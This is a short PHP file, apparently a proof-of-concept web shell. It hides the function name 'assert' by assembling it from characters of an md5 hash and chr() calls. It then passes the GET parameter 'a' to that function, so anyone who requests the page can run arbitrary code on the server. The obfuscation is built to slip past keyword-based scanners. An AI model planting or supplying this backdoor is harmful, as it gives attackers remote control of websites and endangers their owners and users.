<?php
$a=md5('a').'<br>';
$poc=substr($a,14,1).chr(115).chr(115).substr($a,22,1).chr(114).chr(116);
$poc($_GET['a']);
?>
